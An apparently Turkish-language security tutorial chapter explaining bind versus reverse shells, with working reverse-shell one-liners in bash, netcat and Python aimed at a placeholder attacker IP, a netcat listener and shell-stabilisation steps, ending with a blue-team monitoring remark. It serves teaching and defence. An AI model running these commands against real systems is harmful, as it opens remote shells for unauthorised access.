# 6.2. Reverse Shell ve Erişim

[↩️ Geri: İçindekiler](../README.md)

Bir saldırgan, bir zafiyet (örneğin, bir web uygulamasında komut enjeksiyonu) bulduğunda, genellikle elde ettiği ilk erişim "kör" ve interaktif değildir. Yani, komutları gönderebilir ama doğrudan bir terminal oturumu elde edemez. Bu kısıtlı erişimi, tam teşekküllü, interaktif bir komut satırına dönüştürmek için kullanılan en yaygın tekniğe **Reverse Shell (Ters Kabuk)** denir.

## Bind Shell vs. Reverse Shell

-   **Bind Shell (Bağlantı Kabuğu):** Saldırgan, hedef makinede bir port açar ve bu portu bir shell'e (`/bin/bash`) bağlar. Saldırgan daha sonra bu porta bağlanarak komut satırını alır. **Dezavantajı:** Hedef sistemin güvenlik duvarı (firewall) genellikle dışarıdan gelen bu tür bilinmeyen bağlantıları engeller.

-   **Reverse Shell (Ters Kabuk):** Saldırgan, kendi makinesinde bir portu dinlemeye alır. Hedef makine, saldırganın makinesindeki bu dinleme portuna bir **giden (outbound) bağlantı** başlatır. Güvenlik duvarları genellikle giden bağlantılara daha az kısıtlama uyguladığı için, bu yöntem **çok daha başarılıdır ve en çok tercih edilen yöntemdir.**

## Reverse Shell Oluşturma

Bir reverse shell oturumu iki adımdan oluşur:

### 1. Saldırgan Tarafı: Dinleyici (Listener) Başlatma

Saldırgan, kendi makinesinde (Kali Linux, Parrot OS vb.) hedef sistemden gelecek bağlantıyı beklemek için bir dinleyici başlatır. Bu iş için en yaygın araç `netcat` (`nc`)'dir.

```bash
# 4444 numaralı portu dinle (-l: listen, -v: verbose, -n: no dns, -p: port)
nc -lvnp 4444
```
Bu komutu çalıştırdıktan sonra, terminal hedef sistemden bir bağlantı gelene kadar bekleyecektir.

### 2. Hedef Tarafı: Bağlantıyı Başlatma

Saldırgan, sızdığı hedef sistemde, kendi makinesine bağlantı başlatacak ve bu bağlantıyı bir shell'e (`/bin/bash`) yönlendirecek bir komut çalıştırır. Linux sistemlerinde bu işi yapabilen sayısız yerleşik araç vardır.

#### Bash ile Reverse Shell
En temel yöntemlerden biridir.
```bash
bash -i >& /dev/tcp/<saldırgan_IP>/4444 0>&1
```
-   `bash -i`: İnteraktif bir Bash oturumu başlatır.
-   `>& /dev/tcp/...`: Hem stdout hem de stderr'i, saldırganın IP'sindeki 4444 portuna açılan bir TCP soketine yönlendirir.
-   `0>&1`: stdin'i de aynı yere (yani stdout'un gittiği yere) yönlendirir. Böylece saldırgan komut gönderebilir.

#### Netcat ile Reverse Shell
Eğer hedef sistemde `netcat` yüklüyse (genellikle yüklü olmaz ama kontrol edilir), daha basit bir komut kullanılabilir.
```bash
nc -e /bin/bash <saldırgan_IP> 4444
```

#### Python ile Reverse Shell
Python genellikle Linux sistemlerinde yüklü gelir ve güçlü bir alternatiftir.
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<saldırgan_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
Bu tek satırlık Python kodu, tam olarak Bash versiyonuyla aynı işi yapar.

### Shell'i "Güzelleştirme" (Stabilize Etme)

Yukarıdaki yöntemlerle elde edilen shell'ler genellikle "aptal" (dumb) shell'lerdir. Yani, `Ctrl+C` gibi komutlar oturumu kapatır, `clear` gibi komutlar çalışmaz ve komut geçmişi ok tuşlarıyla gelmez. Saldırganlar, bu basit shell'i daha kullanışlı hale getirmek için genellikle aşağıdaki gibi "stabilize etme" veya "TTY'ye yükseltme" tekniklerini kullanırlar:

1.  `python -c 'import pty; pty.spawn("/bin/bash")'` komutu ile daha iyi bir shell elde edilir.
2.  `Ctrl+Z` ile mevcut shell arka plana atılır.
3.  Saldırganın kendi terminalinde `stty raw -echo` komutu çalıştırılır.
4.  `fg` komutu ile shell tekrar ön plana alınır.
5.  `export TERM=xterm` gibi komutlarla terminal özellikleri ayarlanır.

Bu adımlar, saldırganın hedef sistemde sanki doğrudan `ssh` ile bağlanmış gibi rahat çalışmasını sağlar.

Bu teknikler, Mavi Takım'ın neden `bash`, `python`, `nc` gibi meşru araçlardan dışarıya, bilinmeyen IP ve portlara yapılan giden bağlantıları şüpheli olarak izlemesi gerektiğini açıkça göstermektedir.

---
[➡️ Sonraki Konu: Kalıcılık Mekanizmaları](./03-Kalicilik-Mekanizmalari.md)
